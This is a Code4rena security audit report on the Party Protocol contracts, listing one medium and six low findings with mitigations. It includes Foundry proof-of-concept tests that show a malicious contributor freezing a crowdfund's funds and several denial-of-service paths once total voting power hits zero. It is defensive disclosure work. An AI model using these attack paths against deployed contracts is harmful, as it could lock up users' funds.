
# Party Protocol

**Date:** 31.10.2023-10.11.2023

**Platform:** Code4rena

| Severity      | Count |
| :---          |  ---: |
| High          | 0     |
| Medium        | 1     |
| Low           | 6     |
| Non-Critical  | 0     |

# Medium Findings

## [M-01] Users can intentionally freeze funds inside a Crowdfund

### Bug Description
The current crowdfund implementation enforces restrictions on the minimum and maximum total contributions it can receive, as well as the minimum and maximum size of an individual contribution. However, a vulnerability exists because the crowdfund neglects to check if the difference between `minTotalContributions` and `maxTotalContributions` is smaller than `minContribution`.

Due to this a malicious user can push the `totalContributions` into a state where the deposited funds are below the `minTotalContributions` but if another user would donate the `minContribution` it would be pushed above the `maxTotalContributions`. In this case all users would have to wait for the crowdfund to expire. As the duration can be set up to `type(uint40).max` which is 34,842 years, in the worst case all the users funds will be effectively lost. 

![[UserCanDosCrowdfunds.drawio.png]](https://user-images.githubusercontent.com/58374099/282135128-39bf2451-a68f-44f8-8d1e-9c7c96fc705e.png)

### Impact
The impact of this issue varies based on the duration set for the crowdfund. In the best-case scenario, users' funds are temporarily locked up until the crowdfund concludes, typically within a timeframe such as 7 days (as used in the testcases). However, users can specify the duration, and an arbitrarily high value could lead to a prolonged freeze, possibly rendering the funds unrecoverable within their lifetime.

If `maxTotalContributions - minTotalContributions` is small a malicious user would just need to sacrifice a small amount to freeze an arbitrary size amount of other user funds. If the crowdfund does not run for too long, the user could do this just to DOS other users as he will anyways be able to reclaim his funds using `refund()`. If the expiry time is very high, the malicious user would need to sacrifice his funds too, but if he would be able to freeze 1000s of ETH for the cost of a single ETH, it can still be a valid attack path for a malicious actor.

So in summary we have 2 different impact levels here. If the expiry time is within a reasonable timeframe a attacker is able to DOS a crowdfund for the predefined timeframe, which will most likely be above 15 minutes. This could for example be for a NFT he also wants to bid on. If the expiration timeframe will be large, a user will be able to freeze other users funds "forever", by sacrificing some of his funds.

The only way the funds could be rescued is by using the `emergencyExecute()` functionality. If this functionality is disable the user funds will be stuck until the end of the expiry period.

### Proof of Concept
The provided test case exemplifies the described problem. Users contribute to a crowdfund, and just before reaching the full amount, a malicious user deposits the exact amount to prevent the crowdfund from closing. Now the other users need to wait until the end of the expiry to be able to reclaim their funds.

<details>

```solidity
function test_malciousUserCanDosCrowdfund() public {
    // --------- SETUP ------------
    InitialETHCrowdfund crowdfund = _createCrowdfund(
        CreateCrowdfundArgs({
            initialContribution: 0,
            initialContributor: payable(address(0)),
            initialDelegate: address(0),
            minContributions: 4 ether,
            maxContributions: type(uint96).max,
            disableContributingForExistingCard: false,
            minTotalContributions: 98 ether,
            maxTotalContributions: 100 ether,
            duration: 100 days,
            exchangeRateBps: 1e4,
            fundingSplitBps: 0,
            fundingSplitRecipient: payable(address(0)),
            gateKeeper: IGateKeeper(address(0)),
            gateKeeperId: bytes12(0)
        })
    );
    Party party = crowdfund.party();

    assertTrue(crowdfund.getCrowdfundLifecycle() == ETHCrowdfundBase.CrowdfundLifecycle.Active);

    //This address simulates all users of the party
    address member = _randomAddress();
    vm.deal(member, 94 ether);

    //Thsi address simulates a malicious user
    address maliciousUser = _randomAddress();
    vm.deal(maliciousUser, 7 ether);

    //--------- SETUP END ------------

    // Over a certain timeframe all the users contribute to the crowdfund
    vm.prank(member);
    crowdfund.contribute{ value: 90 ether }(member, "");

    //Now the malicious user deposits exactly enough to push the crowdfund in the state where it cna never get finalized
    vm.prank(maliciousUser);
    crowdfund.contribute{ value: 7 ether }(maliciousUser, "");

    //Another normal user will try to deposit the min deposit
    vm.prank(member);
    vm.expectRevert();
    crowdfund.contribute{ value: 4 ether }(member, "");

    //The crowdfund now can not be finalized, not even by the admin. All funds will be stuck until the crowdfund expires.
}
```

</details>

### Tools Used
Manual Review

### Recommended Mitigation Steps
To mitigate this vulnerability, the crowdfund initialization process should include a check to ensure that `maxTotalContributions - minTotalContributions` is greater than the `minContribution`. This can be implemented by incorporating the following check into the `_initialize()` function of `ETHCrowdfundBase`:

```solidity
if (opts.maxTotalContributions - opts.minTotalContributions < opts.minContribution) {
	revert MinMaxDifferenceTooSmall(opts.minTotalContributions, opts.maxTotalContributions);
}
```

# Low Findings

## [L-01] Veto Period should also be skipped if there are no hosts
[PartyGovernance Line 1122](https://github.com/code-423n4/2023-10-party/blob/main/contracts/party/PartyGovernance.sol#L1122)

**Issue Description**

The recent update to `PartyGovernance` introduces a new feature allowing the bypassing of the veto period if all hosts accept a proposal. To facilitate this, the `_hostsAccepted()` function was implemented. Presently, this function only returns true when the snapshot contains more than 0 hosts, and the number of hosts accepting the proposal matches the total number of hosts. Unfortunately, this design overlooks the scenario where a party has no hosts. Consequently, the function erroneously returns false, signaling the need for a veto period even when there are no hosts available to veto the proposal.

**Recommended Mitigation**

To address this issue, it is advisable to enhance the `_hostsAccepted()` functionality to return true even when there are no hosts. This adjustment can be implemented by modifying the function as follows:

```solidity
function _hostsAccepted(
uint8 snapshotNumHosts,
uint8 numHostsAccepted
) private pure returns (bool) {
	return snapshotNumHosts == numHostsAccepted;
}
```

With this modification, the function will correctly return true in scenarios where both `snapshotNumHosts` and `numHostsAccepted` are 0, effectively addressing the oversight.

---
## [L-02] `supportsInterface()` is missing `ERC-1271`
[PartyGovernance Line 333](https://github.com/code-423n4/2023-10-party/blob/main/contracts/party/PartyGovernance.sol#L333)

**Issue Description**

he `PartyGovernance` contract implements `EIP-165` for interface support. According to `EIP-165` guidelines, the `supportsInterface()` function should return true for each `InterfaceId` implemented by the contract. The recent update to `PartyGovernance` introduces support for `EIP-1271`, which is implemented by delegating the `isValidSignature()` function to the `ProposalExecutionEngine`. However, this newly added support for `EIP-1271` is not reflected in the `supportsInterface()` function. As a result, when the `supportsInterface()` function is called with the identifier of `EIP-1271`, it incorrectly returns false, violating the expected behavior.

```solidity
function supportsInterface(bytes4 interfaceId) public pure virtual returns (bool) {
	return
		interfaceId == type(IERC721Receiver).interfaceId ||
		interfaceId == type(ERC1155TokenReceiverBase).interfaceId ||
		// ERC4906 interface ID
		interfaceId == 0x49064906;
}
```

**Recommended Mitigation**

To rectify this issue, it is recommended to update the `supportsInterface()` function to also return true for the interface identifier of `EIP-1271`. This can be achieved by enhancing the code as shown below:

```solidity
function supportsInterface(bytes4 interfaceId) public pure virtual returns (bool) {
	return
		interfaceId == type(IERC721Receiver).interfaceId ||
		interfaceId == type(ERC1155TokenReceiverBase).interfaceId ||
		interfaceId == type(IERC1271).interfaceId ||
		// ERC4906 interface ID
		interfaceId == 0x49064906;
}
```
With this modification, the `supportsInterface()` function accurately reflects the support for `EIP-1271`, aligning with the updated functionality in the contract.

---
## [L-03] emergency execute can not be enabled again in Party & Crowdfund)
[PartyGovernance Line 855-857](https://github.com/code-423n4/2023-10-party/blob/main/contracts/party/PartyGovernance.sol#L855C14-L857)
[ETHCrowdfundBase.sol Line 376-378](https://github.com/code-423n4/2023-10-party/blob/main/contracts/crowdfund/ETHCrowdfundBase.sol#L376-L378)

**Issue Description**

The current implementation of party governance provides the DAO with the ability, in case of an emergency, to use the `emergencyExecute()` function to rescue funds. However, the existing implementation only allows the DAO or a host to permanently disable this functionality using the `disableEmergencyExecute()` function. While it makes sense for the DAO to have a one-way ability to disable this function, it would be beneficial for a host to have the ability to enable it again, especially in emergency situations where funds need to be rescued.

**Recommended Mitigation**

To address this limitation, it is recommended to enhance the contract by adding an additional function called `enableEmergencyExecute()`, which can only be called by a host. This function would enable the emergency execute functionality, providing a mechanism for hosts to reinstate it if needed. The suggested implementation is as follows:

```solidity
function enableEmergencyExecute() external {
	_assertHost(msg.sender);
	emergencyExecuteDisabled = false;
	emit EmergencyExecuteEnabled();
}
```

By incorporating this modification, hosts gain the capability to re-enable the emergency execute functionality in critical situations, allowing for a more flexible and responsive governance model.

---
## [L-04] `passThresholdBps` can not be set to 0
[SetGovernanceParameterProposal.sol Line 53-63](https://github.com/code-423n4/2023-10-party/blob/main/contracts/proposals/SetGovernanceParameterProposal.sol#L53-L63)

**Issue Description**

The introduced functionality allows the party to modify its governance settings through a `SetGovernanceParameterProposal`. This proposal includes the parameter `passThresholdBps`, and if the value falls within the range `0 < passThresholdBps < 10000`, it is set accordingly. However, if the value is 0, it is interpreted as no change desired, and nothing is set. The problem arises when the party intends to set this value to 0, as the current implementation does not permit this action.

**Recommended Mitigation**

To address this limitation, it is suggested to use `type(uint16).max` to indicate that no change is desired, as values above 10000 are already rejected. This adjustment would allow setting the value to 0 without conflicting with the existing implementation.

---
## [L-05] `executionDelay` can not be set to 0
[SetGovernanceParameterProposal.sol Line 42-52](https://github.com/code-423n4/2023-10-party/blob/main/contracts/proposals/SetGovernanceParameterProposal.sol#L42-L52)

**Issue Description**

The introduced functionality allows the party to modify its governance settings through a `SetGovernanceParameterProposal`. This proposal includes the parameter `executionDelay`, and if the value falls within the range `0 < executionDelay < 30 days`, it is set accordingly. However, if the value is 0, it is interpreted as no change desired, and nothing is set. The problem arises when the party intends to set this value to 0, as the current implementation does not permit this action.

**Recommended Mitigation**

To address this limitation, it is suggested to use `type(uint40).max` to indicate that no change is desired, as values above `30 days` are already rejected. This adjustment would allow setting the value to 0 without conflicting with the existing implementation.

## [L-06] totalVotingPower can be reduced to 0, leading to multiple DOS scenarios

### Bug Description
The recent changes to the protocol introduced the functionality for an authority to reduce the `totalVotingPower` of the party using the function `decreaseTotalVotingPower()`. The function allows an authority to decrease the `totalVotingPower` by an arbitrary number, up to the current `totalVotingPower`. However, if the authority decreases the `totalVotingPower` to 0, it results in multiple issues.

### Impact
#### 1. Users Cannot Create New Proposals
Calls to the `propose()` function will revert every time, due to the `propose()` function calling the `accept()` function.  The `accept()` function includes a call to `_areVotesPassing()` which will revert due to a division by 0 in the following [line](https://github.com/code-423n4/2023-10-party/blob/main/contracts/party/PartyGovernance.sol#L1134).

```solidity
return (uint256(voteCount) * 1e4) / uint256(totalVotingPower) >= uint256(passThresholdBps);
```

This not only results in a loss of functionality but also grants authority the power to stop the creation of new proposals intentionally, leading to potential governance freezing.

#### 2. `OffChainValidator` Functionality Denial-of-Service (DOS)
If `totalVotingPower` is set to 0 and `thresholdBps` is not 0 in the `OffChainValidator`, calls to `isValidSignature()` will revert. This is due to a division by zero in the following  [lines](https://github.com/code-423n4/2023-10-party/blob/main/contracts/signature-validators/OffChainSignatureValidator.sol#L71-L77):

```solidity
if (
thresholdBps == 0 ||
(signerVotingPowerBps > totalVotingPower &&
signerVotingPowerBps / totalVotingPower >= thresholdBps)
) {
	return IERC1271.isValidSignature.selector;
}
```

This vulnerability results in a denial-of-service (DOS) of the `ERC1271` functionality.

#### 3. No Ragequitting will be possible
If `totalVotingPower`gets set to 0, users will not be able to ragequit anymore. This is due to a [call](https://github.com/code-423n4/2023-10-party/blob/main/contracts/party/PartyGovernanceNFT.sol#L393) to `getVotingPowerShareOf()` in `rageQuit()`which then calculates:
```solidity
function getVotingPowerShareOf(uint256 tokenId) public view returns (uint256) {
	uint256 totalVotingPower = _getSharedProposalStorage().governanceValues.totalVotingPower;
	return totalVotingPower == 0 ? 0 : (votingPowerByTokenId[tokenId] * 1e18) / totalVotingPower;
}
```
This calculation will lead to a division by 0, reverting everytime. This restriction denies users the ability to withdraw their funds and disassociate from the party.

#### Incorrect NFT SVGs will be rendered
The `PartyNFTRender` contract generates erroneous SVGs for NFTs when `totalVotingPower` is 0. The VotingPowerPercentage becomes "--" due to the `generateVotingPowerPercentage()` function returning "--" in cases where `totalVotingPower` is 0. This inaccuracy in information is then incorporated into the NFT's SVG, providing users with misleading data.

```solidity
function generateVotingPowerPercentage(uint256 tokenId) private view returns (string memory) {
	Party party = Party(payable(address(this)));
	
	uint256 totalVotingPower = getTotalVotingPower();
	if (totalVotingPower == 0) {
		return "--";
	}
	
	...
}
```

#### 4. `tokenURI()` will return incorrect metadata for NFTs
If the `totalVotingPower`get set to 0, the description in the NFTs metadata will state "This item represents membership in %partyName. Exact voting power will be determined when the crowdfund ends. Head to %generateExternalURL() to view the Party's latest activity." which would incorrectly indicates that the party has not yet started. This happens due to the function `generateDescription()` calling to the function `hasPartyStarted()` to determine if it should add a description for before or after the party start. `hasPartyStarted()` will return false if `totalVotingPower` is 0 leading to the incorrect description.

```solidity
function hasPartyStarted() private view returns (bool) {
	return getTotalVotingPower() != 0;
}
```

Every NFT's where the requirement `renderingMethod == RenderingMethod.FixedCrowdfund || (renderingMethod == RenderingMethod.ENUM_OFFSET && getCrowdfundType() == CrowdfundType.Fixed)` does not hold will return an incorrect name in its metadata. The name in the metadata will be "Party Membership" due to the function `generateName()`  [using](https://github.com/code-423n4/2023-10-party/blob/main/contracts/renderers/PartyNFTRenderer.sol#L261) the function `hasPartyStarted()` to determine if the Voting power can already be calculated. Otherwise it just returns "Party Membership" as the name.

```solidity
if (hasPartyStarted()) {
	return string.concat(generateVotingPowerPercentage(tokenId), "% Voting Power");
} else {
	return "Party Membership";
}
```

Additionally no NFT's metadata will contain any attributes due to the function `hasPartyStarted()` being [used](https://github.com/code-423n4/2023-10-party/blob/main/contracts/renderers/PartyNFTRenderer.sol#L240) to determine if attributes should be added in `tokenURI`.

```solidity
hasPartyStarted() ? string.concat('", "attributes": [', generateAttributes(tokenId), "]") : '"', 
"}"
```

#### 5. Voting power of NFTs can arbitrarily be increased by Authority

When the `totalVotingPower` is set to 0, any authority can use `increaseVotingPower()` to increase the voting power of a single NFT as much as they want. This is due to the [capping](https://github.com/code-423n4/2023-10-party/blob/main/contracts/party/PartyGovernanceNFT.sol#L216-L220) of the `mintedVotingPower_`to the `totalVotingPower` only being in place in the function if `totalVotingPower` is not 0, as one can see below.

```solidity
if (totalVotingPower != 0 && totalVotingPower - mintedVotingPower_ < votingPower) {
	unchecked {
		votingPower = totalVotingPower - mintedVotingPower_;
	}
}
```

#### 6. No distribution will be possible
If the `totalVotingPower` gets set to 0, users will not be able to recover their funds using a distribution. This is due to the `distribute()` function checking the `totalVotingPower`, and if the `totalVotingPower` is 0 assumes the governance has not yet started. You can see this from this snippet:

```solidity
if (_getSharedProposalStorage().governanceValues.totalVotingPower == 0) {
	revert PartyNotStartedError();
}
```

### Proof of Concept
In the following one can find multiple POCs, for the more complex of the described issues.

#### Governance
This POC shows the issues where users can propose no new proposals, are not able to ragequit, no distributes can be generated and the authority can increase NFT's voting power arbitrarily:

<details>

```solidity
function testTotalVotingPowerBecomesZero() external {
    // ------------------- SETUP START -------------------
    (
        Party party,
        IERC721[] memory preciousTokens,
        uint256[] memory preciousTokenIds
    ) = partyAdmin.createParty(
        partyImpl,
        PartyAdmin.PartyCreationMinimalOptions({
            host1: address(this),
            host2: address(0),
            passThresholdBps: 5000,
            totalVotingPower: 100,
            preciousTokenAddress: address(toadz),
            preciousTokenId: 1,
            rageQuitTimestamp: 0,
            feeBps: 0,
            feeRecipient: payable(0)
        })
    );

    //Add another address
    address recipient = _randomAddress();

    //Deal tokens to the party
    IERC20[] memory tokens = new IERC20[](1);
    tokens[0] = IERC20(address(new DummyERC20()));

    uint256[] memory minWithdrawAmounts = new uint256[](1);
    minWithdrawAmounts[0] = 0;

    uint96[] memory balances = new uint96[](1);
    balances[0] = uint96(_randomRange(10, type(uint96).max));
    DummyERC20(address(tokens[0])).deal(address(party), balances[0]);

    //Mint Governance NFTs
    partyAdmin.mintGovNft(party, address(john), 50, address(john));
    
    vm.prank(address(partyAdmin));
    uint256 tokenId = party.mint(recipient, 50, recipient);

    //Check that minted voting power is 100
    assertEq(party.mintedVotingPower(), 100);

    //------------------- SETUP END -------------------

    //The voting power gets reduced to 0
    vm.prank(address(partyAdmin));
    party.decreaseTotalVotingPower(100);

    PartyGovernance.Proposal memory p1 = PartyGovernance.Proposal({
        maxExecutableTime: 9999999999,
        proposalData: abi.encodePacked([0]),
        cancelDelay: uint40(1 days)
    });

    // John tries proposing a proposal which will revert due to divison by Zero
    vm.expectRevert();
    john.makeProposal(party, p1, 1);

    uint256[] memory tokenIds = new uint256[](1);
    tokenIds[0] = tokenId;

    //Now the other user tries to ragequit to regain his funds but it reverts
    vm.expectRevert();
    vm.prank(address(recipient));
    party.rageQuit(tokenIds, tokens, minWithdrawAmounts, recipient);
	
	//Now the user tries to use a distribute to reclaim his funds but it reverts
	vm.expectRevert();
	vm.prank(address(recipient));
	party.distribute(address(party).balance, ITokenDistributor.TokenType.Native, ETH_ADDRESS, 0);

    //The authority can now arbitrarily increase any NFT's voting power
    vm.prank(address(partyAdmin));
    party.increaseVotingPower(1, 100_000_000_000);
}
```

</details>

The POC can be run by adding it to the `GovernanceNFT.t.sol` file and running it using `forge test -vvvv --match-test "testTotalVotingPowerBecomesZero"`

#### OffChainValidator

This POC shows that the `OffChainValidator` will stop working when `totalVotingPower` is 0.

<details>

```solidity
function testDOSifTotalVotingPowerIsZero() public {
    //------ SETUP START ------//
    
    //Set total votes of party to 0
    party.decreaseTotalVotingPower(2002);

    // Set the signing threshold to 50%
    vm.prank(address(party));
    offChainGlobalValidator.setSigningThresholdBps(500);
    
    //------- SETUP END -------//

    (bytes32 messageHash, bytes memory signature) = _signMessage(
        johnPk,
        "Hello World! nonce:1000"
    );

    bytes memory staticCallData = abi.encodeWithSelector(
        IERC1271.isValidSignature.selector,
        messageHash,
        signature
    );

    //Any calls will revert not as totalVotingPower is 0
    vm.expectRevert("Division or modulo by 0");
    vm.startPrank(address(0), address(0));
    (bool success, bytes memory res) = address(party).staticcall(staticCallData);
}
```

</details>

The POC can be run by adding it to the `OffChainSignatureValidator.t.sol` file and running it using `forge test -vvvv --match-test "testDOSifTotalVotingPowerIsZero"`

### Tools Used
Manual Review

### Recommended Mitigation Steps

The issue can be mitigated by checking if the `totalVotingPower` would be reduced to 0 by a call to `decreaseTotalVotingPower()`, and if that is the case reverting. This can be done by adapting the function like this:

```solidity
function decreaseTotalVotingPower(uint96 votingPower) external {
	_assertAuthority();
	//We don't need to check for totalVotingPower < votingPower as this would revert anyways due to underflow protection
	require(_getSharedProposalStorage().governanceValues.totalVotingPower != votingPower)
	_getSharedProposalStorage().governanceValues.totalVotingPower -= votingPower;
}
```

